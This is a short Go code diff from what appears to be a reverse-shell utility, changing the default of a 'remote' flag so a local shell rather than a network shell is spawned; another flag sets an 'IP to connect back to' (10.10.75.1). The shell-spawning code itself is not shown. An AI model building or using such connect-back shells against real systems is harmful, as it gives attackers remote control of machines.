@@ -32,7 +32,7 @@ func execute(osType, ip string, remote bool) {
 
 func main() {
 	var ip = flag.String("ip", "10.10.75.1", "IP to connect back to")
-	var remote = flag.Bool("remote", true, "Toggle if you want a local shell, not a network one.")
+	var remote = flag.Bool("remote", false, "Toggle if you want a local shell, not a network one.")
 	flag.Parse()
 	if runtime.GOOS == "windows" {
 		execute("win", *ip, *remote)
